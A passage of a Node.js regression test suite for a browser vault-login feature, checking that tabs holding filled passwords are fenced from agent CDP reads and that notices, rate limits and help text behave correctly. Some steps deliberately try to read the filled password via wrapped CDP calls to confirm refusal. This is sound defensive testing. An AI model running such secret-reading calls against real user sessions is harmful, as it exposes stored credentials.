#!/usr/bin/env node
/**
 * Round 30 regression nails for `vault-login` (8 closing-list items `R30-1`..`R30-8` + 3 extra driven scenes `R30-X1`..`R30-X3`):
 *   - R30-1: Item 1 — Fence affects ONLY the fenced tab, ONLY while it is fenced; sessionless non-tab CDP calls,
 *     sessionless tab-named calls on unfenced tabs, and wrapped `Target.sendMessageToTarget` on unfenced tabs (same
 *     conversation & other conversations) succeed identically to `master`, while calls naming the fenced tab or an
 *     unknown inner session while fenced are refused (`login_fill_live`).
 *   - R30-2: Item 2 — Tab becomes readable again as soon as the value is verifiably gone (next agent read re-runs the
 *     check, lifts when verified empty, and keeps the ordinary ceiling timer); when a check cannot inspect the tab
 *     (`!wr.ok`), it answers `409 login_check_failed` (`"VibeSpace could not check this tab — try again"`), arms no
 *     permanent fence, files 0 `"could not be cleared"` For-you notices, and recovers on the next healthy read.
 *   - R30-3: Item 3 — Channel-fact fallback copy in `browser-dialogs.js` deleted: a keeper without `loginChannelFor`
 *     refuses `409 login_channel_unmediated` (`0` `Input.insertText` calls), and restated `P5` holds on real
 *     `browser-keeper` (local named profiles on `owner`/`instance` roads hand ONLY mediated proxy URLs, never raw CDP).
 *   - R30-4: Item 4 — Post-lift guards survive Hub restart (`guards` persisted in `browser-profiles.json` with 0 secret
 *     bytes and 0 digests) and recheck on the very first read after restart (`liftshort` `< 8`-byte & `liftlong` `>= 8`-byte).
 *   - R30-5: Item 5 — Road mode census (`R29-1d`) catches string-literal `mode: 'relay'` reusing existing `why: 'shared'`
 *     (mutant `M6b`) and enforces `mode` in `{'mediated', 'scope', null}`.
 *   - R30-6: Item 6 — One two-step code pace answer shape across BOTH agent doors (`GET /api/agent/vault/totp/:name`
 *     and `POST /api/agent/browser/fill-vault`): HTTP `429`, `code: 'code_paced'`, single sentence with `secondsLeft`
 *     and `retryInMs`.
 *   - R30-7: Item 7 — `vibespace-vault --help` on `--kind login` states where login requests/fills work (local mediated
 *     named browser profile via `vibespace-browser use <profile>`, not the temporary browser).
 *   - R30-8: Item 8 — `docs/kb-bugfix-invariants.md` preserves `master`'s exact unrelated wording and blank line.
 *   - R30-X1: Extra scene 1 — Page re-mounts filled secret into a brand-new `<input>` element (`createElement` + `appendChild`).
 *   - R30-X2: Extra scene 2 — Job token (`jbt_`) path through real routes + real `browser-keeper` `loginChannelFor`.
 *   - R30-X3: Extra scene 3 — `fake-kernel.mjs` custom-kernel mode (`mode: { standard: false }`).
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import crypto from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';

// B-21cc (the coordinator's r2491): a vault fill acts on the session's CURRENT tab, which the keeper reads from the session's own
// `tab list` (the row marked active). These worlds have no driver session, so each watch made here gets a keeper whose
// `currentTabOf` answers the tab that watch's scene made current (`noteActiveTab`, on the watch or through the route), and refuses
// by name when none was made current — never a guess. Every other keeper member is the world's own.
function withCurrentTab(DmMod) {
  return { ...DmMod, create(opts = {}) {
    const cur = new Map();
    const k0 = opts.keeper || null;
    const keeper = k0 ? Object.assign({}, k0, { currentTabOf: async ({ profileId = '', browserKey = '' } = {}) => { const id = cur.get(String(profileId || '') + '|' + String(browserKey || '')); return id ? { ok: true, targetId: id } : { ok: false, code: 'current_tab_unreadable', error: 'VibeSpace could not read which tab this conversation is on (this world made none current) — nothing was filled; try again' }; } }) : k0;
    const d = DmMod.create({ ...opts, keeper });
    const n0 = d.noteActiveTab;
    if (typeof n0 === 'function') d.noteActiveTab = (t, id) => { if (t && id) cur.set(String(t.profileId || '') + '|' + String(t.browserKey || ''), String(id)); return n0(t, id); };
    return d;
  } };
}

const SELF_PATH = fileURLToPath(import.meta.url);
const quiet = { log() {}, warn() {}, error() {} };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
// B-518e (the R30 member, the R29 child's sibling): a step waits on the FACT it needs — asked a bounded COUNT of times from ONE
// pool for the child (1500 asks, at most 300 a wait: a broken road keeps the child inside the parent's 30 s kill and each later
// red is its own) — never a fixed sleep raced against the product's 250 ms ceiling (900 asks, at most 150 a wait: every fact
// lands in ms, the slowest is the real 250 ms timer)
let askPool = 900;
const until = async (fn, { tries = 150, step = 10 } = {}) => {
  const n = Math.max(1, Math.min(tries, askPool));
  for (let k = 0; k < n; k++) { askPool = Math.max(0, askPool - 1); if (await fn()) return true; await sleep(step); }
  return Boolean(await fn());
};
// the tab's own state, read without a check (dialogs._watches: a look that starts no ceiling — liveFillOnTarget would start one
// once the handed-in clock has passed it)
const tabEntry = (dlg, pid, tid) => {
  const w = dlg && dlg._watches ? dlg._watches.get(String(pid)) : null;
  return w ? [...w.targets.values()].find((e) => e && String(e.targetId).toUpperCase() === String(tid).toUpperCase()) || null : null;
};
const fenceLifted = (dlg, pid, tid) => { const e = tabEntry(dlg, pid, tid); return Boolean(e) && !e.liveFill; };
const wipeSettled = (dlg, pid, tid) => { const e = tabEntry(dlg, pid, tid); return Boolean(e) && (!e.liveFill || !e.liveFill.wiping); };
// …and a lift is SETTLED once the product's own 35 ms post-lift recheck has run (its timer and its check both done): a refill
// the leg puts back after that is caught by the leg's read, never by that recheck racing it (the R30 read's MUST)
const postLiftQuiet = (dlg, pid, tid) => { const e = tabEntry(dlg, pid, tid); return Boolean(e) && !e.postLiftTimer && !e.postLiftChecking; };
const liftSettled = (dlg, pid, tid) => fenceLifted(dlg, pid, tid) && postLiftQuiet(dlg, pid, tid);

async function startKernelRelay(fk) {
  const { WebSocketServer, WebSocket } = createRequire(import.meta.url)('ws');
  const state = {
    upstreamCalls: [],
    hook: null,
  };
  let relayPort = 0;
  const relayHttp = http.createServer((req, res) => {
    http.get({ host: '127.0.0.1', port: fk.port, path: req.url }, (upRes) => {
      let body = '';
      upRes.setEncoding('utf8');
      upRes.on('data', (d) => { body += d; });
      upRes.on('end', () => {
        const rewritten = body.replaceAll(`127.0.0.1:${fk.port}`, `127.0.0.1:${relayPort}`);
        res.writeHead(upRes.statusCode || 200, { 'Content-Type': 'application/json' });
        res.end(rewritten);
      });
    }).on('error', () => {
      res.writeHead(502);
      res.end();
    });
  });
  const wss = new WebSocketServer({ noServer: true });
  relayHttp.on('upgrade', (req, sock, head) => {
    const upUrl = `ws://127.0.0.1:${fk.port}${req.url}`;
    const upWs = new WebSocket(upUrl);
    upWs.once('open', () => {
      wss.handleUpgrade(req, sock, head, (clientWs) => {
        const sendToClient = (obj) => {
          if (clientWs.readyState === WebSocket.OPEN) {
            try { clientWs.send(JSON.stringify(obj)); } catch { /* gone */ }
          }
        };
        upWs.on('message', (raw) => {
          if (clientWs.readyState === WebSocket.OPEN) {
            try { clientWs.send(String(raw)); } catch { /* gone */ }
          }
        });
        upWs.on('close', () => { try { clientWs.close(); } catch { /* gone */ } });
        clientWs.on('message', async (raw) => {
          const text = String(raw);
          let msg = null;
          try { msg = JSON.parse(text); } catch { /* raw */ }
          if (msg && msg.method) state.upstreamCalls.push(msg);
          if (state.hook && msg) {
            const handled = await state.hook(msg, { sendToClient, upWs });
            if (handled === true) return;
          }
          if (upWs.readyState === WebSocket.OPEN) {
            try { upWs.send(text); } catch { /* gone */ }
          }
        });
        clientWs.on('close', () => { try { upWs.close(); } catch { /* gone */ } });
      });
    });
    upWs.on('error', () => { try { sock.destroy(); } catch { /* gone */ } });
  });
  await new Promise((r) => relayHttp.listen(0, '127.0.0.1', r));
  relayPort = relayHttp.address().port;
  return {
    port: relayPort,
    wsUrl: `ws://127.0.0.1:${relayPort}/devtools/browser/fake-kernel`,
    state,
    async close() {
      for (const c of wss.clients) { try { c.terminate(); } catch { /* */ } }
      await new Promise((r) => relayHttp.close(r));
    },
  };
}

async function openCdpClient(WebSocket, wsUrl) {
  const ws = new WebSocket(wsUrl);
  await new Promise((res, rej) => { ws.once('open', res); ws.once('error', rej); });
  let seq = 0;
  const pending = new Map();
  const innerReplies = new Map();
  ws.on('message', (raw) => {
    let m = null;
    try { m = JSON.parse(String(raw)); } catch { return; }
    if (m.id && pending.has(m.id)) {
      const fn = pending.get(m.id);
      pending.delete(m.id);
      fn(m);
      return;
    }
    if (m.method === 'Target.receivedMessageFromTarget' && m.params && typeof m.params.message === 'string') {
      try {
        const inner = JSON.parse(m.params.message);
        if (inner && inner.id && innerReplies.has(inner.id)) {
          const fn = innerReplies.get(inner.id);
          innerReplies.delete(inner.id);
          fn(inner);
        }
      } catch { /* ignore */ }
    }
  });
  const call = (method, params = {}, sessionId = undefined, timeoutMs = 2000) => new Promise((resolve) => {
    const id = ++seq;
    const timer = setTimeout(() => { pending.delete(id); resolve({ id, timeout: true }); }, timeoutMs);
    pending.set(id, (msg) => { clearTimeout(timer); resolve(msg); });
    const payload = { id, method, params };
    if (sessionId) payload.sessionId = sessionId;
    try { ws.send(JSON.stringify(payload)); } catch (e) { clearTimeout(timer); pending.delete(id); resolve({ id, error: { message: String(e) } }); }
  });
  const callWrapped = async (innerSid, method, params = {}, timeoutMs = 1200) => {
    const innerId = 10_000 + (++seq);
    const innerP = new Promise((resolve) => {
      const timer = setTimeout(() => { innerReplies.delete(innerId); resolve({ timeout: true }); }, timeoutMs);
      innerReplies.set(innerId, (msg) => { clearTimeout(timer); resolve(msg); });
    });
    const outer = await call('Target.sendMessageToTarget', {
      sessionId: innerSid,
      message: JSON.stringify({ id: innerId, method, params }),
    }, undefined, timeoutMs);
    if (outer.error || outer.timeout) {
      innerReplies.delete(innerId);
      return { outer, inner: null };
    }
    const inner = await innerP;
    return { outer, inner };
  };
  const evalOnTarget = async (targetId, expression) => {
    const att = await call('Target.attachToTarget', { targetId, flatten: true });
    const sid = att.result?.sessionId;
    const iw = await call('Page.createIsolatedWorld', { frameId: targetId, worldName: 'oracle' }, sid);
    const contextId = iw.result?.executionContextId;
    const r = await call('Runtime.evaluate', { expression, contextId, returnByValue: true }, sid);
    await call('Target.detachFromTarget', { sessionId: sid }).catch(() => {});
    return r.result?.result?.value;
  };
  return {
    ws,
    call,
    callWrapped,
    evalOnTarget,
    close() { try { ws.close(); } catch { /* gone */ } },
  };
}

function installFakeAgentBrowser(binDir, abStateDir) {
  fs.mkdirSync(binDir, { recursive: true, mode: 0o700 });
  fs.mkdirSync(abStateDir, { recursive: true, mode: 0o700 });
  const script = `#!${process.execPath}
const fs = require('fs'), path = require('path'), { spawn } = require('child_process');
const st = process.env.FAKE_AB_STATE;
const ns = process.env.AGENT_BROWSER_NAMESPACE || 'default';
const f = path.join(st, ns + '.json');
const writeState = (s) => { const t = f + '.' + process.pid + '.tmp'; fs.writeFileSync(t, JSON.stringify(s)); fs.renameSync(t, f); };   // the fake's state by a temp file of its own process and a rename: no verb's read meets a torn file when two of its processes run at once (lane bl-loop-b, 主开发 r5152)
const read = () => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return null; } };
const alive = (pid) => { try { process.kill(pid, 0); return true; } catch { return false; } };
const out = (o) => { process.stdout.write(JSON.stringify(o) + '\\n'); };
const argv = process.argv.slice(2).filter((x) => x !== '--pin-tab');
const [a, b] = argv;
if (a === '--version') { console.log('agent-browser 0.38.2'); process.exit(0); }
if (a === 'session' && b === 'info') {
  const s = read();
  const act = !!(s && alive(s.pid));
  out({ success: true, data: { active: act, namespace: ns, pid: act ? s.pid : null, session: process.env.AGENT_BROWSER_SESSION || null, socketDir: path.join(st, ns, 'run') } });
  process.exit(0);
}
if (a === 'open') {
  let s = read();
  if (!(s && alive(s.pid))) {
    const c = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 120000)'], { detached: true, stdio: 'ignore' });
    c.unref();
    s = { pid: c.pid, profile: process.env.AGENT_BROWSER_PROFILE || null, cdp: process.env.AGENT_BROWSER_CDP || null };
    writeState(s);
  }
  out({ success: true, data: { url: b } });
  process.exit(0);
}
if (a === 'get' && b === 'cdp-url') {
  const s = read();
  if (!(s && alive(s.pid))) { out({ success: false, error: 'fake: no browser' }); process.exit(1); }
  out({ success: true, data: { cdpUrl: process.env.FAKE_CDP_URL } });
  process.exit(0);
}
if (a === 'tab' && b === 'new') {
  out({ success: true, data: { targetId: process.env.FAKE_TARGET_ID || 'T-1', url: 'about:blank' } });
  process.exit(0);
}
if (a === 'tab') {
  out({ success: true, data: { active: b || '0' } });
  process.exit(0);
}
if (a === 'close') {
  const s = read();
  if (s && s.pid) { try { process.kill(s.pid, 'SIGTERM'); } catch {} }
  try { fs.unlinkSync(f); } catch {}
  out({ success: true, data: { closed: true } });
  process.exit(0);
}
out({ success: true, data: {} });
`;
  const p = path.join(binDir, 'agent-browser');
  fs.writeFileSync(p, script, { mode: 0o755 });
  return p;
}

export async function runR30LoginNails({ repoDir, ok }) {
  const req = createRequire(path.join(repoDir, 'package.json'));
  const express = req('express');
  const { WebSocket } = req('ws');
  const BM = req('./src/browser-mediation.js');
  const BF = req('./src/browser-facts.js');
  const LF = req('./src/server/browser-login-fill.js');
  const VE = req('./src/server/vault-engine.js');
  const VT = req('./src/server/vault-totp.js');
  const GS = req('./src/server/grants-store.js');
  const BK = req('./src/server/browser-keeper.js');
  const Lm = req('./src/server/browser-logins.js');
  const Dm = withCurrentTab(req('./src/server/browser-dialogs.js')); // B-21cc: each watch's keeper answers its current tab
  const CM = req('./src/server/cdp-mediator.js');
  const Rm = req('./src/routes/browser.js');
  const VRm = req('./src/routes/vault.js');
  const { startFakeKernel } = await import(pathToFileURL(path.join(repoDir, 'scripts/fixtures/fake-kernel.mjs')).href);

  console.log('⑩ Round 30 regression nails (closing list R30-1..R30-8 + 3 extra driven scenes R30-X1..R30-X3)');

  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-r30-nails-'));
  try {
    // ──────────────────────────────────────────────────────────────────────────
    // R30-1: Item 1 — Fence affects ONLY the fenced tab while fenced
    // ──────────────────────────────────────────────────────────────────────────
    {
      const ORIGIN = 'https://item1r30.example.test';
      const PW = 'Item1TabOnly!2026_R30';
      const dataDir = path.join(tmpRoot, 'd-r30-1');
      const homeDir = path.join(tmpRoot, 'h-r30-1');
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });

      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
      const tidA = fk.targets()[0].targetId;
      const tidB = fk.addTarget(`${ORIGIN}/other`);
      const tidC = fk.addTarget(`${ORIGIN}/conv2`);
      fk.setDom(tidA, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      fk.setDom(tidB, { url: `${ORIGIN}/other`, elements: [{ id: 'ok', tag: 'div', text: 'Other Tab' }] });
      fk.setDom(tidC, { url: `${ORIGIN}/conv2`, elements: [{ id: 'ok2', tag: 'div', text: 'Second Conv' }] });
      const relay = await startKernelRelay(fk);
      const med = CM.create({ log: quiet });
      await med.listen();

      const KEY_A = 'bk-0000301a';
      const KEY_B = 'bk-0000301b';
      const keeper = BK.create({
        dataDir,
        homeDir,
        env: () => ({ HOME: homeDir }),
        liveKeys: () => new Set([KEY_A, KEY_B]),
        log: quiet,
        install: false,
        mediator: med,
      });
      const prof = keeper.createProfile({ label: 'R30TabScope', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
      const PID = prof.id;
      const grantA = await med.grantFor({ profileId: PID, browserKey: KEY_A, upstream: relay.wsUrl, targetIds: [tidA, tidB], mode: 'scope' });
      const grantB = await med.grantFor({ profileId: PID, browserKey: KEY_B, upstream: relay.wsUrl, targetIds: [tidC], mode: 'scope' });

      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
      await vault.setup('r30-1-pw');
      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
      const logins = Lm.create({ vault, grants: () => grants, log: quiet.log });
      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });

      const keeperWrap = {
        ...keeper,
        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: relay.wsUrl } : { ok: false }),
      };
      const dialogs = Dm.create({
        keeper: keeperWrap,
        logins,
        holdersOf: () => [{ browserKey: KEY_A, sessionId: 's-a' }, { browserKey: KEY_B, sessionId: 's-b' }],
        leaseCountOf: () => 2,
        log: quiet,
      });
      try {
        await dialogs.arm(PID);
        dialogs.bindTab?.({ profileId: PID, browserKey: KEY_A }, tidA);
        dialogs.bindTab?.({ profileId: PID, browserKey: KEY_A }, tidB);
        dialogs.bindTab?.({ profileId: PID, browserKey: KEY_B }, tidC);
        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY_A }, tidA);

        const wsA = await openCdpClient(WebSocket, grantA.url);
        const wsB = await openCdpClient(WebSocket, grantB.url);
        const attA = await wsA.call('Target.attachToTarget', { targetId: tidA, flatten: false });
        const attB = await wsA.call('Target.attachToTarget', { targetId: tidB, flatten: false });
        const attC = await wsB.call('Target.attachToTarget', { targetId: tidC, flatten: false });
        const sidA = attA.result?.sessionId;
        const sidB = attB.result?.sessionId;
        const sidC = attC.result?.sessionId;

        const fillRes = await dialogs.fillVaultField(
          { profileId: PID, browserKey: KEY_A },
          { target: '#pw', spec: 'item1r30.example.test#alice/password', targetId: tidA, facts: { conversationKeys: [KEY_A] } },
        );

        const cCookies = await wsA.call('Storage.getCookies', {});
        const cDownload = await wsA.call('Target.getTargets', {});   // (lane chrome-157, the rebase onto 2.369.402: a sessionless call the release still forwards — setDownloadBehavior 'deny' is now refused by the whole-profile law)
        const cWinB = await wsA.call('Browser.getWindowForTarget', { targetId: tidB });
        const cWinA = await wsA.call('Browser.getWindowForTarget', { targetId: tidA });
        const wrapUnfencedSameConv = await wsA.call('Target.sendMessageToTarget', {
          sessionId: sidB,
          message: JSON.stringify({ id: 11, method: 'Runtime.evaluate', params: { expression: '1+1', returnByValue: true } }),
        });
        const wrapUnfencedOtherConv = await wsB.call('Target.sendMessageToTarget', {
          sessionId: sidC,
          message: JSON.stringify({ id: 12, method: 'Runtime.evaluate', params: { expression: '2+2', returnByValue: true } }),
        });
        const wrapFenced = await wsA.call('Target.sendMessageToTarget', {
          sessionId: sidA,
          message: JSON.stringify({ id: 13, method: 'Runtime.evaluate', params: { expression: 'document.querySelector("#pw").value', returnByValue: true } }),
        });
        const wrapInnerParamFenced = await wsA.call('Target.sendMessageToTarget', {
          sessionId: sidB,
          message: JSON.stringify({ id: 14, method: 'Browser.getWindowForTarget', params: { targetId: tidA } }),
        });
        const wrapUnknown = await wsA.call('Target.sendMessageToTarget', {
          sessionId: 'sid-unknown-999',
          message: JSON.stringify({ id: 15, method: 'Runtime.evaluate', params: { expression: '1', returnByValue: true } }),
        });

        wsA.close();
        wsB.close();

        const noLeak = !JSON.stringify({ wrapFenced, wrapInnerParamFenced, wrapUnknown, cWinA }).includes(PW);
        ok(
          fillRes.ok === true
            && !cCookies.error && !cCookies.timeout
            && !cDownload.error && !cDownload.timeout
            && !cWinB.error && !cWinB.timeout
            && Boolean(cWinA.error && /login_fill_live/.test(cWinA.error.message || ''))
            // (the rebase onto 2.369.402: the release's whole-profile law refuses EVERY wrapped call, method_refused, before any fence —
            // unfenced tabs of either conversation get exactly that answer; the fenced, inner-param and unknown ones are refused too)
            && [wrapUnfencedSameConv, wrapUnfencedOtherConv].every((x) => Boolean(x.error && /^method_refused: Target\.sendMessageToTarget/.test(x.error.message || '')))
            && [wrapFenced, wrapInnerParamFenced, wrapUnknown].every((x) => Boolean(x.error && /login_fill_live|method_refused/.test(x.error.message || '')))
            && noLeak,
          'R30-1 (Item 1 fenced-tab-only isolation): sessionless non-tab calls and sessionless unfenced-tab calls succeed, every wrapped Target.sendMessageToTarget gets the release\'s whole-profile refusal (unfenced tabs of both conversations alike), while fenced-tab and unknown-inner-session calls refuse login_fill_live',
          { cCookies, cDownload, cWinB, cWinA, wrapUnfencedSameConv, wrapUnfencedOtherConv, wrapFenced, wrapInnerParamFenced, wrapUnknown },
        );
      } finally {
        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
        dialogs.shutdown();
        keeper.shutdown();
        vault.close();
        await med.shutdown();
        await relay.close();
        await fk.close();
      }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R30-2 & R30-X1: Item 2 (readable when verifiably gone + honest check_failed) & Extra Scene 1 (new <input> node)
    // ──────────────────────────────────────────────────────────────────────────
    {
      const ORIGIN = 'https://item2r30.example.test';
      const PW = 'Item2LiftCheck!2026_R30';
      const dataDir = path.join(tmpRoot, 'd-r30-2');
      const homeDir = path.join(tmpRoot, 'h-r30-2');
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
      let clock = 1_765_500_000_000;

      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
      const tid = fk.targets()[0].targetId;
      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const relay = await startKernelRelay(fk);
      const med = CM.create({ log: quiet });
      await med.listen();

      const KEY = 'bk-0000302a';
      const SID = 'sess-r30-2';
      const TOKEN = 'vsst_r30_2_' + crypto.randomBytes(8).toString('hex');
      const fyItems = [];
      const forYou = {
        add: (_pid, item) => { const id = 'fy-' + (fyItems.length + 1); fyItems.push({ id, status: 'open', ...item }); return id; },
        resolve: (id) => { const f = fyItems.find((x) => x.id === id); if (f) f.status = 'resolved'; },
      };

      const keeper = BK.create({
        dataDir,
        homeDir,
        env: () => ({ HOME: homeDir }),
        liveKeys: () => new Set([KEY]),
        log: quiet,
        now: () => clock,
        install: false,
        mediator: med,
      });
      const prof = keeper.createProfile({ label: 'R30LiftProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
      const PID = prof.id;
      const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: relay.wsUrl, targetIds: [tid], mode: 'scope' });

      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
      await vault.setup('r30-2-pw');
      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
      const logins = Lm.create({ vault, grants: () => grants, forYou, now: () => clock, log: quiet.log });
      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });

      const keeperWrap = {
        ...keeper,
        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: relay.wsUrl } : { ok: false }),
        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: tid }],
        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
        attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
      };
      const dialogs = Dm.create({
        keeper: keeperWrap,
        logins,
        forYou,
        now: () => clock,
        liveFillMaxMs: 250,
        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
        leaseCountOf: () => 1,
        conversationOf: () => ({ cid: 'conv-r30-2', name: 'Agent R30-2' }),
        log: quiet,
      });
      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Agent R30-2', cwd: tmpRoot, backendSessionId: 'conv-r30-2' }]]);
      Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
      const app = express();
      app.use(express.json());
      app.use(Rm.router);
      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
      const rawWs = await openCdpClient(WebSocket, relay.wsUrl);
      try {
        const pageEval = (expr) => rawWs.evalOnTarget(tid, expr);
        const base = `http://127.0.0.1:${srv.address().port}`;
        const post = async (u, body) => {
          const r = await fetch(base + u, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
            body: JSON.stringify(body),
          });
          return { status: r.status, json: await r.json() };
        };
        const rd = (argv) => post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv, targetId: tid });

        await dialogs.arm(PID);
        dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);

        // Fill #pw and lift via ceiling
        const f1 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'item2r30.example.test#alice/password', targetId: tid });
        clock += 500;
        await rd(['get', 'title']);   // (the read starts the ceiling on the clock handed in)
        const lift1 = await until(() => liftSettled(dialogs, PID, tid));   // B-518e: the lift's fact (settled), never an 80 ms sleep
        const afterLift = await rd(['get', 'value', '#pw']);

        // Part A: Page puts PW back -> read #1 wipes & refuses 409 login_fill_live -> read #2 verifies empty & returns 200!
        await pageEval(`(() => { const n = document.querySelector('#pw'); n.value = ${JSON.stringify(PW)}; return 1; })()`);
        const refillRead1 = await rd(['get', 'value', '#pw']);
        const domAfterRead1 = fk.readDomValues(tid).pw;
        const refillRead2 = await rd(['get', 'title']);
        const openFyAfterLift = fyItems.filter((x) => x.status === 'open');

        // Also verify ordinary ceiling timer still runs on a postLiftHeld fence when unread:
        // (B-518e, the R30 read's should: the TIMER's wipe is HELD at the relay — its Runtime calls wait while the fence is wiping —
        // so reading heldBeforeCeiling can never lose a race to the real 250 ms timer; and the wipe seen with no read in flight
        // proves the timer was its road)
        let openTimerWipe = null;
        const timerGate = new Promise((r) => { openTimerWipe = r; });
        const hookBeforeTimer = relay.state.hook;
        relay.state.hook = async (m, x) => {
          const r0 = typeof hookBeforeTimer === 'function' ? await hookBeforeTimer(m, x) : undefined;
          if (r0 === true) return true;
          if (openTimerWipe && /^Runtime\./.test(String((m && m.method) || '')) && tabEntry(dialogs, PID, tid)?.liveFill?.wiping === true) await timerGate;
          return r0;
        };
        await pageEval(`(() => { const n = document.querySelector('#pw'); n.value = ${JSON.stringify(PW)}; return 1; })()`);
        const refillRead3 = await rd(['get', 'value', '#pw']);
        const heldBeforeCeiling = Boolean(dialogs.liveFillOnTarget(PID, tid));
        // the ceiling's TIMER (its real 250 ms — the leg's point: it runs on a postLiftHeld fence nobody reads) has started the wipe —
        // the tab's own state (a look that starts no check, no read in flight: the timer is the only road)
        const timerWiping = await until(() => tabEntry(dialogs, PID, tid)?.liveFill?.wiping === true);
        clock += 500;
        { const go = openTimerWipe; openTimerWipe = null; go(); }
        relay.state.hook = hookBeforeTimer;
        // …and its lift has SETTLED (the 35 ms recheck done before Part B's failing hook), never a 310 ms sleep (B-518e)
        const timerLift = await until(() => liftSettled(dialogs, PID, tid));
        const heldAfterCeiling = dialogs.liveFillOnTarget(PID, tid);

        // Part B: Recheck fails once (`Runtime.evaluate` + `Page.getFrameTree` error) -> 409 login_check_failed, 0 For-you, next read 200!
        let failEval = 1, failTree = 1;
        relay.state.hook = (m, { sendToClient }) => {
          if (m.method === 'Runtime.evaluate' && failEval > 0) {
            failEval--;
            sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'Execution context was destroyed.' } });
            return true;
          }
          if (m.method === 'Page.getFrameTree' && failTree > 0) {
            failTree--;
            sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'busy' } });
            return true;
          }
          return false;
        };
        const checkFailRead = await rd(['get', 'title']);
        relay.state.hook = null;
        const fenceAfterCheckFail = dialogs.liveFillOnTarget(PID, tid);
        const openFyAfterCheckFail = fyItems.filter((x) => x.status === 'open');
        const nextHealthyRead = await rd(['get', 'title']);
        const failErr = String(checkFailRead.json?.error || '');

        ok(
          f1.status === 200
            && lift1 && timerWiping && timerLift
            && afterLift.status === 200
            && refillRead1.status === 409 && refillRead1.json?.code === 'login_fill_live' && domAfterRead1 === ''
            && refillRead2.status === 200
            && openFyAfterLift.length === 0
            && refillRead3.status === 409 && heldBeforeCeiling === true && heldAfterCeiling === null
            && checkFailRead.status === 409 && checkFailRead.json?.code === 'login_check_failed'
            && /could not check this tab\s*[—-]\s*try again/i.test(failErr)
            && !/currently filling|could not be cleared/i.test(failErr)
            && fenceAfterCheckFail === null
            && openFyAfterCheckFail.length === 0
            && nextHealthyRead.status === 200,
          'R30-2 (Item 2 readable once gone + honest check_failed): post-lift refill wipes on read #1 (0 For-you notices), lifts to 200 on read #2 (and at ceiling), and failed check returns 409 login_check_failed without locking the empty tab',
          { lift1, timerWiping, timerLift, refillRead1, domAfterRead1, refillRead2, openFyAfterLift, heldBeforeCeiling, heldAfterCeiling, checkFailRead, fenceAfterCheckFail, nextHealthyRead },
        );

        // R30-X1: Page re-mounts filled secret into a brand-new <input id="pw2"> via createElement + appendChild!
        const mkNewNode = await pageEval(`(() => {
          const old = document.querySelector('#pw');
          if (old && old.remove) old.remove();
          const n = document.createElement('input');
          n.id = 'pw2';
          n.type = 'password';
          n.value = ${JSON.stringify(PW)};
          document.body.appendChild(n);
          return Boolean(document.querySelector('#pw2') && document.querySelector('#pw2').value.length === ${PW.length});
        })()`);
        const x1Read1 = await rd(['get', 'value', '#pw2']);
